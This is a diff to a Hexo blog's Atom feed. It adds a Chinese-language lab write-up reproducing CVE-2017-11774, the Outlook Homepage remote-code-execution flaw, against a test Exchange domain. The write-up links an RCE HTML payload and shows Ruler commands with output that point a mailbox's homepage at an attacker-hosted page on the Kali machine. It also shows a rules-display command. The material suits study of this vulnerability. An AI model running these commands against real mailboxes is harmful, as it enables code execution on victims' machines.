@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://sp4rr0w.github.io/"/>
-  <updated>2018-04-11T12:34:24.317Z</updated>
+  <updated>2018-05-30T12:03:02.324Z</updated>
   <id>https://sp4rr0w.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Outlook Homepage Vulner</title>
+    <link href="https://sp4rr0w.github.io/2018/05/30/Outlook%20Homepage%20Vulner/"/>
+    <id>https://sp4rr0w.github.io/2018/05/30/Outlook Homepage Vulner/</id>
+    <published>2018-05-30T23:28:00.000Z</published>
+    <updated>2018-05-30T12:03:02.324Z</updated>
+    
+    <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><p>域控制器 ： OWA2013DC - 10.1.0.100   域名：corp.contoso.com</p><p>Exchange服务器 ： OWA2013Server - 10.1.0.213    加入域</p><p>Kali ： 10.1.0.166   未加入域</p><p>虚拟机模式: hostonly</p><p>三台网关:10.1.0.100 </p><p>hosts: 10.1.0.213    corp.contoso.com    contoso.com        autodiscover.contoso.com</p><p><code>CVE-2017-11774</code></p><pre><code>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11774 </code></pre><p><code>Description</code></p><pre><code>Microsoft Outlook 2010 SP2, Outlook 2013 SP1 and RT SP1, and Outlook 2016 allow an attacker to execute arbitrary commands, due to how Microsoft Office handles objects in memory, aka &quot;Microsoft Outlook Security Feature Bypass Vulnerability.&quot;</code></pre><h2 id="新建邮箱用户-Exchange-management-shell"><a href="#新建邮箱用户-Exchange-management-shell" class="headerlink" title="新建邮箱用户 (Exchange management shell)"></a>新建邮箱用户 (Exchange management shell)</h2><p>New-Mailbox -Name ‘crazy’ -UserPrincipalName <a href="mailto:crazy@contoso.com" target="_blank" rel="noopener">crazy@contoso.com</a></p><p><img src="/2018/05/30/Outlook Homepage Vulner/new-mailbox.JPG" alt="new-mailbox"></p><p>会自动创建域用户 crazy</p><p><img src="/2018/05/30/Outlook Homepage Vulner/new-mailbox2.JPG" alt="new-mailbox"></p><p>登陆 </p><pre><code>https://localhost/owa/auth/logon.aspx?replaceCurrent=1&amp;reason=2&amp;url=https%3a%2f%2flocalhost%2fecp%2f</code></pre><p>==&gt; ok</p><h2 id="windows上新建一个mailbox"><a href="#windows上新建一个mailbox" class="headerlink" title="windows上新建一个mailbox"></a>windows上新建一个mailbox</h2><p>填入邮箱及密码<br><img src="/2018/05/30/Outlook Homepage Vulner/add-mail.JPG" alt="add-mail"></p><h2 id="触发homepage漏洞"><a href="#触发homepage漏洞" class="headerlink" title="触发homepage漏洞"></a>触发homepage漏洞</h2><pre><code>打开 crazy 邮箱 (outlook )-&gt; 点击 inbox 并右键 Data File Properties   -&gt; 写入 homepage内容 [outlookHomepageRCE](https://gist.githubusercontent.com/staaldraad/c7b857e9bd6fd332f6f1bd01a2160266/raw/16fb7bb5aac443f4541dd0557062445d128b9813/outlookHomepageRCE.html)    -&gt; crazy@corp.contoso.com ( 点击 inbox 弹出 notepad )</code></pre><p><img src="/2018/05/30/Outlook Homepage Vulner/homepage1.JPG" alt="homepage"></p><p>当然也可使用工具 Ruler ( kali )</p><pre><code>/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy homepage add --url http://10.1.0.166/1.htmlPassword: [+] Retrieving MAPI/HTTP info[+] Binding to RPC[+] Creating new endpoint[+] Verifying...[+] New endpoint set[+] Trying to force trigger/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy homepage displayPassword: [+] Retrieving MAPI/HTTP info[+] Binding to RPC[+] Getting existing endpoint[+] Found endpoint: http://10.1.0.166/1.html[+] Webview is set as ENABLED</code></pre><p><img src="/2018/05/30/Outlook Homepage Vulner/homepage3.JPG" alt="kali-homepage"></p><p>通过这个漏洞,可以执行命令…</p><h2 id="还有恶意规则漏洞-Ruler工具"><a href="#还有恶意规则漏洞-Ruler工具" class="headerlink" title="还有恶意规则漏洞 (Ruler工具)"></a>还有恶意规则漏洞 (Ruler工具)</h2><pre><code>/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy display    Password:     [+] Retrieving MAPI/HTTP info    [+] Binding to RPC    [+] Retrieving Rules    [+] No Rules Found</code></pre><h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><pre><code>此漏洞要知道邮箱账号密码此漏洞只针对未打补丁的outlook客户端 ( Outlook 2010 SP2, Outlook 2013 SP1 and RT SP1, and Outlook 2016 )</code></pre><p>##参考<br>    <a href="https://github.com/sensepost/ruler/wiki/Rules" target="_blank" rel="noopener">https://github.com/sensepost/ruler/wiki/Rules</a><br>    <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/" target="_blank" rel="noopener">https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/</a> </p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;…..&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
+    
+    
+      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="漏洞" scheme="https://sp4rr0w.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="Outlook homepage" scheme="https://sp4rr0w.github.io/tags/Outlook-homepage/"/>
+    
+  </entry>
   
   <entry>
     <title>搭建私有Tor网络</title>
